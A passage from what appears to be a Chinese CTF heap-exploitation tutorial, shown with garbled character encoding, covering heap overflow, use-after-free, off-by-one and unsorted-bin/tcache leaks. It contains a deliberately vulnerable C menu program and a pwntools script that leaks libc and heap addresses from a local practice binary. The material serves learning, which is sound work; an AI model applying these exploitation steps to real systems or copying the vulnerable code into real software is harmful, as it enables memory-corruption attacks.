†æº¢å‡ºæ˜¯æŒ‡ç¨‹åºå‘æŸä¸ªå †å—ä¸­å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†å †å—æœ¬èº«å¯ä½¿ç”¨çš„å­—èŠ‚æ•°ï¼ˆ<strong>ä¹‹æ‰€ä»¥æ˜¯å¯ä½¿ç”¨è€Œä¸æ˜¯ç”¨æˆ·ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œæ˜¯å› ä¸ºå †ç®¡ç†å™¨ä¼šå¯¹ç”¨æˆ·æ‰€ç”³è¯·çš„å­—èŠ‚æ•°è¿›è¡Œè°ƒæ•´ï¼Œè¿™ä¹Ÿå¯¼è‡´å¯åˆ©ç”¨çš„å­—èŠ‚æ•°éƒ½ä¸å°äºç”¨æˆ·ç”³è¯·çš„å­—èŠ‚æ•°</strong>ï¼‰ï¼Œå› è€Œå¯¼è‡´äº†æ•°æ®æº¢å‡ºï¼Œå¹¶è¦†ç›–åˆ°<strong>ç‰©ç†ç›¸é‚»çš„é«˜åœ°å€</strong>çš„ä¸‹ä¸€ä¸ªå †å—ã€‚</p><p>ä¸éš¾å‘ç°ï¼Œå †æº¢å‡ºæ¼æ´å‘ç”Ÿçš„åŸºæœ¬å‰ææ˜¯</p><ul><li><p>ç¨‹åºå‘å †ä¸Šå†™å…¥æ•°æ®ã€‚</p></li><li><p>å†™å…¥çš„æ•°æ®å¤§å°æ²¡æœ‰è¢«è‰¯å¥½åœ°æ§åˆ¶ã€‚</p></li></ul><p>å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œå †æº¢å‡ºæ¼æ´è½»åˆ™å¯ä»¥ä½¿å¾—ç¨‹åºå´©æºƒï¼Œé‡åˆ™å¯ä»¥ä½¿å¾—æ”»å‡»è€…æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚  </p><p>å †æº¢å‡ºæ˜¯ä¸€ç§ç‰¹å®šçš„ç¼“å†²åŒºæº¢å‡ºï¼ˆè¿˜æœ‰æ ˆæº¢å‡ºï¼Œ bss æ®µæº¢å‡ºç­‰ï¼‰ã€‚ä½†æ˜¯å…¶ä¸æ ˆæº¢å‡ºæ‰€ä¸åŒçš„æ˜¯ï¼Œå †ä¸Šå¹¶ä¸å­˜åœ¨è¿”å›åœ°å€ç­‰å¯ä»¥è®©æ”»å‡»è€…ç›´æ¥æ§åˆ¶æ‰§è¡Œæµç¨‹çš„æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬ä¸€èˆ¬æ— æ³•ç›´æ¥é€šè¿‡å †æº¢å‡ºæ¥æ§åˆ¶ EIP ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬åˆ©ç”¨å †æº¢å‡ºçš„ç­–ç•¥æ˜¯</p><ol><li>è¦†ç›–ä¸å…¶<strong>ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ª chunk</strong>Â çš„å†…å®¹ã€‚<br>Â  Â  - <code>prev_size</code><br>Â  Â  - <code>size</code>ï¼Œä¸»è¦æœ‰ä¸‰ä¸ªæ¯”ç‰¹ä½ï¼Œä»¥åŠè¯¥å †å—çœŸæ­£çš„å¤§å°ã€‚<br>Â  Â  Â  Â  - <code>NON_MAIN_ARENA</code><br>Â  Â  Â  Â  - <code>IS_MAPPED</code><br>Â  Â  Â  Â  - <code>PREV_INUSE</code><br>Â  Â  Â  Â  - the True chunk size<br>Â  Â  - chunk contentï¼Œä»è€Œæ”¹å˜ç¨‹åºå›ºæœ‰çš„æ‰§è¡Œæµã€‚</li><li>åˆ©ç”¨å †ä¸­çš„æœºåˆ¶ï¼ˆå¦‚ unlink ç­‰ ï¼‰æ¥å®ç°ä»»æ„åœ°å€å†™å…¥ï¼ˆ Write-Anything-Anywhereï¼‰æˆ–æ§åˆ¶å †å—ä¸­çš„å†…å®¹ç­‰æ•ˆæœï¼Œä»è€Œæ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµã€‚</li></ol><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>Use After Free æŒ‡çš„å°±æ˜¯é‡Šæ”¾åä½¿ç”¨ï¼šå½“ä¸€ä¸ªæŒ‡é’ˆæ‰€æŒ‡å‘çš„æŒ‡é’ˆå—è¢«é‡Šæ”¾æ‰ä¹‹åå¯ä»¥å†æ¬¡è¢«ä½¿ç”¨ï¼Œä½†æ˜¯è¿™æ˜¯æœ‰è¦æ±‚çš„ã€‚</p><p>å½“ä¸€ä¸ªå†…å­˜è¢«é‡Šæ”¾åé‡æ–°ä½¿ç”¨æœ‰å¦‚ä¸‹å‡ ç§æƒ…å†µï¼š</p><ul><li><code>chunk</code>è¢«é‡Šæ”¾ä¹‹åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆè¢«è®¾ç½®ä¸º<code>NULL</code>ï¼Œå¦‚æœå†æ¬¡ä½¿ç”¨å®ƒï¼Œç¨‹åºå°±ä¼šå´©æºƒã€‚</li><li><code>chunk</code>è¢«é‡Šæ”¾ä¹‹åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæœªè¢«è®¾ç½®ä¸º<code>NULL</code>ï¼Œå¦‚æœåœ¨ä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰æ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆå†æ¬¡ä½¿ç”¨è¿™ä¸ªæŒ‡é’ˆæ—¶ç¨‹åºå¾ˆæœ‰å¯èƒ½æ­£å¸¸è¿è½¬ã€‚</li><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º<code>NULL</code>ï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œå°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜ã€‚</li></ul><p>åœ¨å †ä¸­ Use After Free ä¸€èˆ¬æŒ‡çš„æ˜¯åä¸¤ç§æ¼æ´ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç§°è¢«é‡Šæ”¾åæ²¡æœ‰è¢«è®¾ç½®ä¸º<code>NULL</code>çš„å†…å­˜æŒ‡é’ˆä¸º<strong>dangling pointerï¼ˆæ‚¬ç©ºæŒ‡é’ˆã€æ‚¬å‚æŒ‡é’ˆï¼‰</strong></p><blockquote><p>æœªè¢«åˆå§‹åŒ–è¿‡çš„å†…å­˜æŒ‡é’ˆç§°ä¸ºé‡æŒ‡é’ˆ</p></blockquote><ul><li>ç¤ºä¾‹</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">char</span> *p1;<br>p1=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>)*<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">memcpy</span>(p1,<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-number">10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p1 addr:%x,%s\n&quot;</span>,p1,p1);<br><span class="hljs-built_in">free</span>(p1);<br><span class="hljs-type">char</span> *p2;<br>p2=(<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>)*<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">memcpy</span>(p2,<span class="hljs-string">&quot;world&quot;</span>,<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p2 addr:%x,%s\n&quot;</span>,p2,p1);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚ä¸Šä»£ç ï¼ŒæŒ‡é’ˆ<code>p1</code>ç”³è¯·<code>0x10</code>å†…å­˜ï¼Œæ‰“å°å…¶åœ°å€ï¼Œå€¼ã€‚</p><p>ç„¶åé‡Šæ”¾<code>p1</code></p><p>æŒ‡é’ˆ<code>p2</code>ç”³è¯·åŒæ ·å¤§å°çš„å†…å­˜ï¼Œæ‰“å°<code>p2</code>çš„åœ°å€ï¼Œ<code>p1</code>æŒ‡é’ˆæŒ‡å‘çš„å€¼</p><p><code>p1</code>ä¸<code>p2</code>åœ°å€ç›¸åŒï¼Œ<code>p1</code>æŒ‡é’ˆé‡Šæ”¾åï¼Œ<code>p2</code>ç”³è¯·ç›¸åŒçš„å¤§å°çš„å†…å­˜ï¼Œæ“ä½œç³»ç»Ÿä¼šå°†ä¹‹å‰ç»™<code>p1</code>çš„åœ°å€åˆ†é…ç»™<code>p2</code>ï¼Œä¿®æ”¹<code>p2</code>çš„å€¼ï¼Œ<code>p1</code>ä¹Ÿè¢«ä¿®æ”¹äº†ã€‚</p><p>ç”±æ­¤æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼š</p><ol><li>åœ¨<code>free</code>ä¸€å—å†…å­˜åï¼Œæ¥ç€ç”³è¯·å¤§å°ç›¸åŒçš„ä¸€å—å†…å­˜ï¼Œæ“ä½œç³»ç»Ÿä¼šå°†åˆšåˆšfreeæ‰çš„å†…å­˜å†æ¬¡åˆ†é…ï¼Œæ ¹æœ¬åŸå› æ˜¯<code>dlmalloc</code></li></ol><blockquote><p>å½“åº”ç”¨ç¨‹åºè°ƒç”¨<code>free()</code>é‡Šæ”¾å†…å­˜æ—¶ï¼Œå¦‚æœå†…å­˜å—å°äº<code>256kb</code>ï¼Œ<code>dlmalloc</code>å¹¶ä¸é©¬ä¸Šå°†å†…å­˜å—é‡Šæ”¾å›å†…å­˜ï¼Œè€Œæ˜¯å°†å†…å­˜å—æ ‡è®°ä¸ºç©ºé—²çŠ¶æ€ã€‚è¿™ä¹ˆåšçš„åŸå› æœ‰ä¸¤ä¸ªï¼šä¸€æ˜¯å†…å­˜å—ä¸ä¸€å®šèƒ½é©¬ä¸Šé‡Šæ”¾å›å†…æ ¸ï¼ˆæ¯”å¦‚å†…å­˜å—ä¸æ˜¯ä½äºå †é¡¶ç«¯ï¼‰ï¼ŒäºŒæ˜¯ä¾›åº”ç”¨ç¨‹åºä¸‹æ¬¡ç”³è¯·å†…å­˜ä½¿ç”¨ï¼ˆè¿™æ˜¯ä¸»è¦åŸå› ï¼‰ã€‚å½“<code>dlmalloc</code>ä¸­ç©ºé—²å†…å­˜é‡è¾¾åˆ°ä¸€å®šå€¼æ—¶<code>dlmalloc</code>æ‰å°†ç©ºé—²å†…å­˜é‡Šæ”¾å›å†…æ ¸ã€‚å¦‚æœåº”ç”¨ç¨‹åºç”³è¯·çš„å†…å­˜å¤§äº<code>256kb</code>ï¼Œ<code>dlmalloc</code>è°ƒç”¨<code>mmap()</code>å‘å†…æ ¸ç”³è¯·ä¸€å—å†…å­˜ï¼Œè¿”å›è¿”è¿˜ç»™åº”ç”¨ç¨‹åºä½¿ç”¨ã€‚å¦‚æœåº”ç”¨ç¨‹åºé‡Šæ”¾çš„å†…å­˜å¤§äº<code>256kb</code>ï¼Œ<code>dlmalloc</code>é©¬ä¸Šè°ƒç”¨<code>munmap()</code>é‡Šæ”¾å†…å­˜ã€‚<code>dlmalloc</code>ä¸ä¼šç¼“å­˜å¤§äº<code>256kb</code>çš„å†…å­˜å—ï¼Œå› ä¸ºè¿™æ ·çš„å†…å­˜å—å¤ªå¤§äº†ï¼Œæœ€å¥½ä¸è¦é•¿æœŸå ç”¨è¿™ä¹ˆå¤§çš„å†…å­˜èµ„æºã€‚</p></blockquote><ol start="2"><li>é€šè¿‡<code>p2</code>èƒ½å¤Ÿæ“ä½œ<code>p1</code>ï¼Œå¦‚æœä¹‹å<code>p1</code>ç»§ç»­è¢«ä½¿ç”¨ï¼ˆuse after freeï¼‰ï¼Œåˆ™å¯ä»¥è¾¾åˆ°é€šè¿‡<code>p2</code>ä¿®æ”¹ç¨‹åºåŠŸèƒ½ç­‰ç›®çš„ã€‚</li></ol><p>å¸¸è§åˆ©ç”¨ï¼š</p><ul><li>å­˜åœ¨showçš„æ—¶å€™ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ unsorted biné…åˆ uaf è¾“å‡ºmain_arenaçš„åœ°å€ï¼Œè®¡ç®—libc</li><li>å­˜åœ¨editçš„æ—¶å€™ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨å¤§éƒ¨åˆ†æ”»å‡»æ‰‹æ³•</li><li>æ— editçš„æ—¶å€™ï¼Œè€ƒè™‘double free</li></ul><p>çº¯ç²¹çš„uafæ¼æ´å¹¶æ— æ³•è¿›è¡Œæ”»å‡»ã€‚</p><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h3><p>ç‰¹æ®Šçš„å †æº¢å‡ºæ¼æ´ï¼Œä¸€å­—èŠ‚æº¢å‡º</p><h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off-by-null"></a>off-by-null</h3><p>off-by-nullçš„åˆ©ç”¨æ¯”è¾ƒè‹›åˆ»ï¼Œä¸€èˆ¬ä»…èƒ½é€‰æ‹©ä½¿ç”¨ small binçš„åˆå¹¶è¿›è¡Œoverlapã€‚</p><h2 id="unsorted-bin-leak"><a href="#unsorted-bin-leak" class="headerlink" title="unsorted bin leak"></a>unsorted bin leak</h2><p>ç”±äº unsorted bin æ˜¯åŒå‘é“¾è¡¨ï¼Œå› æ­¤åœ¨ unsorted bin é“¾è¡¨ä¸­å¿…æœ‰ä¸€ä¸ªèŠ‚ç‚¹çš„Â <code>fd</code>Â æŒ‡é’ˆä¼šæŒ‡å‘Â <code>main_arena</code>Â ç»“æ„ä½“å†…éƒ¨ã€‚å¦‚æœæˆ‘ä»¬å¯ä»¥æŠŠæ­£ç¡®çš„Â <code>fd</code>Â æŒ‡é’ˆ leak å‡ºæ¥ï¼Œå°±å¯ä»¥è·å¾—ä¸€ä¸ªä¸Â <code>main_arena</code>Â æœ‰å›ºå®šåç§»çš„åœ°å€ï¼Œè¿™ä¸ªåç§»å¯ä»¥é€šè¿‡è°ƒè¯•å¾—å‡ºã€‚</p><p><img src="/../../musl/assets/Pasted%20image%2020241203235534.png"></p><p>è€Œ<code>main_arena</code>Â æ˜¯ä¸€ä¸ªÂ <code>struct malloc_state</code>Â ç±»å‹çš„å…¨å±€å˜é‡ï¼Œæ˜¯Â <code>ptmalloc</code>Â ç®¡ç†ä¸»åˆ†é…åŒºçš„å”¯ä¸€å®ä¾‹ã€‚è¯´åˆ°å…¨å±€å˜é‡ï¼Œç«‹é©¬å¯ä»¥æƒ³åˆ°ä»–ä¼šè¢«åˆ†é…åœ¨Â <code>.data</code>Â æˆ–è€…Â <code>.bss</code>Â ç­‰æ®µä¸Šï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æœ‰è¿›ç¨‹æ‰€ä½¿ç”¨çš„Â <code>libc</code>Â çš„Â <code>.so</code>Â æ–‡ä»¶çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å¾—Â <code>main_arena</code>Â ä¸Â <code>libc</code>Â åŸºåœ°å€çš„åç§»ï¼Œä»è€Œè·å– libc çš„åŸºåœ°å€ã€‚</p><p><code>main_arena</code>Â å’ŒÂ <code>__malloc_hook</code>Â çš„åœ°å€å·®æ˜¯ 0x10ï¼Œè€Œå¤§å¤šæ•°çš„ libc éƒ½å¯ä»¥ç›´æ¥æŸ¥å‡ºÂ <code>__malloc_hook</code>Â çš„åœ°å€ï¼Œè¿™æ ·å¯ä»¥å¤§å¹…å‡å°å·¥ä½œé‡ã€‚ä»¥ pwntools ä¸ºä¾‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">main_arena_offsetÂ =Â ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>).symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] +Â <span class="hljs-number">0x10</span><br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥è·å¾—Â <code>main_arena</code>Â ä¸åŸºåœ°å€çš„åç§»äº†ã€‚</p><p>ç¤ºä¾‹ç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">char</span> *chunk_list[<span class="hljs-number">0x100</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. add chunk&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. delete chunk&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. edit chunk&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. show chunk&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;5. exit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;choice:&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_num</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x10</span>];<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>    <span class="hljs-keyword">return</span> atoi(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add_chunk</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    <span class="hljs-type">int</span> index = get_num();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;size:&quot;</span>);<br>    <span class="hljs-type">int</span> size = get_num();<br>    chunk_list[index] = <span class="hljs-built_in">malloc</span>(size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_chunk</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    <span class="hljs-type">int</span> index = get_num();<br>    <span class="hljs-built_in">free</span>(chunk_list[index]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit_chunk</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    <span class="hljs-type">int</span> index = get_num();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;length:&quot;</span>);<br>    <span class="hljs-type">int</span> length = get_num();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;content:&quot;</span>);<br>    read(<span class="hljs-number">0</span>, chunk_list[index], length);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show_chunk</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    <span class="hljs-type">int</span> index = get_num();<br>    <span class="hljs-built_in">puts</span>(chunk_list[index]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        menu();<br>        <span class="hljs-keyword">switch</span> (get_num()) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: add_chunk(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: delete_chunk(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: edit_chunk(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: show_chunk(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>: <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>: <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;invalid choice.&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>context(arch=elf.arch, os=elf.os)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process([elf.path])<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_chunk</span>(<span class="hljs-params">index, size</span>):<br>    p.sendafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&quot;size:&quot;</span>, <span class="hljs-built_in">str</span>(size))<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_chunk</span>(<span class="hljs-params">index</span>):<br>    p.sendafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit_chunk</span>(<span class="hljs-params">index, content</span>):<br>    p.sendafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&quot;length:&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.sendafter(<span class="hljs-string">&quot;content:&quot;</span>, content)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_chunk</span>(<span class="hljs-params">index</span>):<br>    p.sendafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index))<br> <br>add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>)<br>add_chunk(<span class="hljs-number">3</span>, <span class="hljs-number">0x20</span>)<br>add_chunk(<span class="hljs-number">1</span>, <span class="hljs-number">0x80</span>)<br>add_chunk(<span class="hljs-number">4</span>, <span class="hljs-number">0x20</span>)<br>add_chunk(<span class="hljs-number">2</span>, <span class="hljs-number">0x80</span>)<br>delete_chunk(<span class="hljs-number">0</span>)<br>delete_chunk(<span class="hljs-number">1</span>)<br>add_chunk(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>)<br>show_chunk(<span class="hljs-number">0</span>)<br>libc.address = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7F&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x39bb78</span><br>info(<span class="hljs-string">&quot;libc base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc.address))<br>edit_chunk(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span>)<br>show_chunk(<span class="hljs-number">0</span>)<br>heap_base = u64(p.recvuntil((<span class="hljs-string">&#x27;\x55&#x27;</span>, <span class="hljs-string">&#x27;\x56&#x27;</span>))[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) &amp; ~<span class="hljs-number">0xFFF</span><br>info(<span class="hljs-string">&quot;heap base: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br>gdb.attach(p)<br> <br>p.interactive()<br></code></pre></td></tr></table></figure><p>é€šè¿‡å †æº¢å‡ºè¿›è¡Œ unlinkï¼Œç„¶åé€ æˆä»»æ„åœ°å€å†™è¿›è¡Œ getshell</p><h2 id="tcacheæ³„éœ²å †åœ°å€"><a href="#tcacheæ³„éœ²å †åœ°å€" class="headerlink" title="tcacheæ³„éœ²å †åœ°å€"></a>tcacheæ³„éœ²å †åœ°å€</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>)<br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡tcache"><a href="#ç»•è¿‡tcache" class="headerlink" title="ç»•è¿‡tcache"></a>ç»•è¿‡tcache</h2><p>glibc 2.26ä»¥åçš„ bins å­˜åœ¨ tcache bins</p><p>è®©é‡Šæ”¾çš„<code>chunk</code>ä¸è¿›å…¥tcacheçš„æ–¹æ³•</p><p>éœ€è¦ç»•è¿‡tcacheä¸€èˆ¬æ˜¯å› ä¸ºï¼Œ<code>calloc</code>å¹¶ä¸ä»tcacheä¸­å–<code>chunk</code>ï¼Œè€Œæ˜¯ä»fastbinä¸­å–<code>chunk</code>ã€‚</p><p>å¦ä¸€ä¸ªæ˜¯å› ä¸ºé«˜ç‰ˆæœ¬çš„glibcä¸­å¯¹äºtcacheçš„double freeæ£€æŸ¥ä¸¥æ 